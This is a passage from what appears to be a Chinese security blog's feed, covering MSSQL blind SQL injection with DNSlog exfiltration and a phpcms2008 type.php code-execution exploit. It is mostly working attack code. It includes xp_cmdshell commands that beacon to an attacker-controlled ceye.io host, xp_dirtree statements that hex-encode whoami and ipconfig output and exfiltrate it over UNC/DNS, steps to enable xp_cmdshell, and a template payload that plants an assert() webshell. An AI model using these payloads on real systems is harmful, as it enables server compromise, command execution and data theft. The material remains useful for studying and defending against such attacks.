(&apos;dir&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Nv2m454pz5MX.png?imageslim" alt="mark"></p><p><strong>但是通过这种方法获取到的结果，会被空格截断，可以看到上面接收的结果都是不完整的，遇到空格就会被截断，不显示后面的内容</strong></p><p><strong>另外这种方法还有一些缺点，就是会在服务器启动大量的浏览器进程，有可能会导致服务器卡死或者被防火墙拦截，需要时不时的关闭浏览器进程</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- </code></pre><p><strong>其它思路</strong></p><p><strong>可以通过此方法获取网站的根目录，之后将命令的执行结果写入到根目录的一个文件中</strong></p><p><strong>遍历C盘下的aspx后缀文件</strong></p><pre><code>exec master..xp_cmdshell &quot;for /r C:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/LF9YA9cPAbmS.png?imageslim" alt="mark"></p><p><strong>遍历D盘下的aspx文件</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- exec master..xp_cmdshell &quot;for /r D:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/n67mO6S9UwDH.png?imageslim" alt="mark"></p><p><strong>最终确定了D:/zhenghedabu/这个路径就是网站的物理路径了。</strong></p><p><strong>获取到网站的物理路径后，会有更多的利用手法</strong></p><p><strong>比如可以将命令的执行结果输出到网站目录下的一个txt文本文件当中当中</strong></p><pre><code>exec master..xp_cmdshell &quot;ipconfig &gt; D:\zhenghedabu\tmp2019.txt&quot;-- </code></pre><p><strong>之后可以看到命令执行的结果</strong><br><img src="http://pic.c1imber.top/blog/20191109/jg9FftdPdj94.png?imageslim" alt="mark"></p><p><strong>同样的，知道了网站物理路径，也可以直接写入webshell</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>使用dnslog可以有效的增加渗透的效率，避免了在盲注上花费过多的时间，但是思路也不能单单禁锢于这一种方式，比如mssql的注入点，可以执行命令，那么也可以直接通过反弹shell到公网的服务器上的。所以方法思路还是很多的，要合理使用才能事半功倍。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧-使用dnslog加快盲注速度(MSSQL篇)&quot;&gt;&lt;/a&gt;渗透技巧-使用
      
    
    </summary>
    
      <category term="web安全" scheme="https://c1aysec.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://c1aysec.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次dnslog接收异常分析</title>
    <link href="https://c1aysec.github.io/2019/01/11/%E8%AE%B0%E4%B8%80%E6%AC%A1dnslog%E6%8E%A5%E6%94%B6%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2019/01/11/记一次dnslog接收异常分析/</id>
    <published>2019-01-11T08:08:50.000Z</published>
    <updated>2019-11-08T15:20:47.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次dnslog接收异常分析"><a href="#记一次dnslog接收异常分析" class="headerlink" title="记一次dnslog接收异常分析"></a>记一次dnslog接收异常分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下</strong></p><a id="more"></a><p><strong>通过手工注入将命令执行结果发送至dnslog的语句如下：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">--</span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>以上语句用来执行whoami，然后使用dnslog接收命令执行的结果，结果如图</strong><br><img src="http://pic.c1imber.top/blog/20190111/y4ATogsXvqnW.png" alt="mark"></p><p><strong>这几条语句大致的意思是首先创建一个临时表，之后使用<code>xp_cmdshell</code>这个存储过程去执行whoami并将命令执行的结果插入到这个临时表，然后查询临时表的内容并将查询结果通过<code>xp_dirtree</code>这个存储过程发送至dnslog，这里需要对结果进行16进制编码，因为UNC路径里不允许有一些特殊字符，至于为什么要使用这种方式呢，一是因为网站有防护，直接上sqlmap的话会被封ip影响渗透，二是因为该注入点只能通过盲注，布尔盲注和时间盲注的速度我就不说了，大家都懂的，通过结果可以看到可以成功的执行whoami，但是接下来问题就出现了，我在执行ipconfig的时候出现了意料之外的结果,首先需要获取命令执行结果的长度，因为在使用dnslog注入的时候，UNC路径的长度也有限制，不能超过128个字符，超出长度的话语句就会执行失败，语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">-- </span></div><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>语句的作用首先删除临时表，执行ipconfig并将命令执行的结果插入临时表，接着查询结果并进行16进制编码，并且获取长度，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20190111/Q1gGLf0EFcSP.png" alt="mark"></p><p><strong>可以看到这里出现了一个奇怪的问题，获取到的长度仅仅为62字节，而ipconfig的输出肯定是比这个要长的，接下来把内容输出一下看看</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/pv73SFvb8xOF.png" alt="mark"></p><p><strong>可以看到并没有报错，成功接收到了结果，但是可以看出全是空白字符，这里猜测命令的执行结果是多行的，但是这里只获取了第一行结果的长度和内容</strong></p><p><strong>本地分析测试一波：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/IKImOlhIrW2m.png" alt="mark"><br><strong>报错说禁止访问xp_cmdshell,开启一下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">',1;RECONFIGURE;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/C5kidFPi7UAT.png" alt="mark"><br><strong>现在可以了</strong><br><img src="http://pic.c1imber.top/blog/20190111/RrJ8rlemlQKn.png" alt="mark"><br><strong>重新插入，执行ipconfig</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/h9VBVHwqDAsU.png" alt="mark"><br><strong>通过结果可以看到确实是这样子没错，在将命令的执行结果插入表中的时候遇到了换行符，所以将执行结果插入到了多行内,第一行为空字符</strong><br><img src="http://pic.c1imber.top/blog/20190111/96glQf7Y0h9L.png" alt="mark"></p><p><strong>解决办法：</strong></p><p><strong>创建表的时候增加主键，之后逐行查询，修改后的语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY));</div></pre></td></tr></table></figure><p><strong>再次查询一下经过16进制编码后的长度，发现长度依旧被截断到了 62字节,wtf!?</strong><br><img src="http://pic.c1imber.top/blog/20190111/JwNvgKzhUdrq.png" alt="mark"><br><strong>但是直接查询内容的话并没有发现内容被截断</strong><br><img src="http://pic.c1imber.top/blog/20190111/Q5R2SXMtXd2X.png" alt="mark"><br><strong>说明截断发生在了16进制转换的过程中，分析了一波发现原来是由于转化为二进制的时候没有给VARBINARY设置长度，所以转化成二进制的时候使用的是默认长度而导致后面的内容被截断了，修改一下语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)));</div></pre></td></tr></table></figure><p><strong>没有再发生截断问题</strong><br><img src="http://pic.c1imber.top/blog/20190111/k8jMVa6v8aS4.png" alt="mark"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>));</div></pre></td></tr></table></figure><p><strong>发现长度为512字节，后面多出的会由空格x20填充</strong></p><p><strong>之后通过一系列折腾，总结使用dnslog接收sqlserver执行命令结果的方法</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div></pre></td></tr></table></figure><p><strong>第二步：将命令执行结果插入临时表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div></pre></td></tr></table></figure><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>+(<span class="keyword">select</span> <span class="keyword">rtrim</span>(<span class="keyword">cast</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>))) <span class="keyword">from</span> tt_tmp)+<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">1</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>每次截取60个字符，直到截取完512个字符为止</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">61</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div><div class="line">...</div><div class="line">...</div><div class="line">总共截取9次，可以写脚本完成</div><div class="line"></div><div class="line">1-60</div><div class="line">61-120</div><div class="line">121-180</div><div class="line">181-240</div><div class="line">241-300</div><div class="line">301-360</div><div class="line">361-420</div><div class="line">421-480</div><div class="line">481-512</div></pre></td></tr></table></figure><p><strong>第五步：删除临时表，用于接收下一次命令执行的结果</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">--</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;a href=&quot;#记一次dnslog接收异常分析&quot; class=&quot;headerlink&quot; title=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;/a&gt;记一次dnslog接收异常分析&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>phpcms2008 type.php代码执行漏洞分析与复现</title>
    <link href="https://c1aysec.github.io/2018/12/21/phpcms2008%20type.php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://c1aysec.github.io/2018/12/21/phpcms2008 type.php代码执行漏洞/</id>
    <published>2018-12-21T12:21:50.000Z</published>
    <updated>2019-11-06T17:04:41.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpcms2008-type-php代码执行漏洞分析与复现"><a href="#phpcms2008-type-php代码执行漏洞分析与复现" class="headerlink" title="phpcms2008 type.php代码执行漏洞分析与复现"></a>phpcms2008 type.php代码执行漏洞分析与复现</h1><h3 id="phpcms2008安装问题："><a href="#phpcms2008安装问题：" class="headerlink" title="phpcms2008安装问题："></a>phpcms2008安装问题：</h3><p><strong>安装时出现如下错误</strong><br><img src="http://pic.c1imber.top/blog/20181221/QpCFWTtDJwoh.png" alt="mark"></p><p><strong>修改以下文件”TYPE=MyISAM”处，修改为”ENGINE=MyISAM”</strong></p><p><strong>php文件：</strong></p><pre><code>/ads/include/create.table.php/install.php/include/admin/global.func.php/include/admin/sql.func.php/install/install.php</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/ymb5x1PwgDpL.png" alt="mark"><br><strong>以及所有的.sql文件，”TYPE=MyISAM”修改为”ENGINE=MyISAM”</strong><br><img src="http://pic.c1imber.top/blog/20181221/4nP9Llvw7Ml6.png" alt="mark"><br><strong>就可以安装成功了</strong><br><img src="http://pic.c1imber.top/blog/20181221/CrNRV2k4Fgqh.png" alt="mark"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p><strong>payload:</strong></p><p><strong>在存在漏洞的网站后输入：</strong></p><pre><code>type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/OvkOxH3tP93B.png" alt="mark"><br><strong>之后将会在/data/cache_template/目录下生成rss.tpl.php文件，template的值被成功写入到该文件内，产生任意代码执行</strong></p><p><strong>接着访问：</strong></p><pre><code>/data/cache_template/rss.tpl.php?1=phpinfo();</code></pre><p><strong>即可执行phpinfo()</strong><br><img src="http://pic.c1imber.top/blog/20181221/U65J6DwPpbsA.png" alt="mark"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><strong>根据payload可知入口点在type.php,重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</div></pre></td></tr></table></figure><p><strong>其中$tamplate参数可控</strong></p><p><strong>下面来看/include/common.inc.php</strong></p><p><strong>重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_REQUEST)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(MAGIC_QUOTES_GPC)</div><div class="line">&#123;</div><div class="line">$_REQUEST = new_stripslashes($_REQUEST);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</div><div class="line">extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">$_POST = $db-&gt;escape($_POST);</div><div class="line">$_GET = $db-&gt;escape($_GET);</div><div class="line">$_COOKIE = $db-&gt;escape($_COOKIE);</div><div class="line">@extract($_POST,EXTR_SKIP);</div><div class="line">@extract($_GET,EXTR_SKIP);</div><div class="line">@extract($_COOKIE,EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>以上的代码可用来接收传入的template，其中extract函数会对传入的GPC关联数组当中的键值对进行变量注册，其中EXTR_SKIP参数表示当变量名冲突时，不覆盖原有变量，所以当在GPC当中传入template参数时，传入的值会作为参数传入include template(‘phpcms’, $template)这里，跟进相关的函数，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line"><span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</div><div class="line">&#123;</div><div class="line"><span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</div><div class="line">template_compile($module, $template, $istag);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $compiledtplfile;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'TPL_CACHEPATH'</span>, PHPCMS_ROOT.<span class="string">'data/cache_template/'</span>); <span class="comment">//模板缓存物理路径</span></div><div class="line">define(<span class="string">'TPL_ROOT'</span>, PHPCMS_ROOT.<span class="string">'templates/'</span>); <span class="comment">//模板保存物理路径</span></div><div class="line">define(<span class="string">'TPL_NAME'</span>, <span class="string">'default'</span>); <span class="comment">//当前模板方案目录</span></div></pre></td></tr></table></figure><p><strong>代码将传入的$template经过拼接后赋值给$compiledtplfile,此时$compiledtplfile的值变为了：</strong></p><pre><code>/data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.tpl.php</code></pre><p><strong>这里的payload构造很有想象力，里这巧妙了利用了一个目录穿越的技巧，所以会将<code>phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{/</code>看成是一个目录，接着<code>../</code>则会跳过该目录</strong></p><p><strong>之后将路径传入file_exists检查文件是否存在，这里检查的文件路径实际上为：</strong></p><pre><code>/data/cache_template/rss.tpl.php</code></pre><p><strong>其中TPL_REFRESH为默认值1，并且/data/cache_template/rss.tpl.php这个文件是不存在的，所以符合条件，接着$tamplate被传入<code>template_compile($module, $template, $istag);</code>，跟进对应的函数</strong></p><p><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</div><div class="line">$content = @file_get_contents($tplfile);</div><div class="line"><span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span 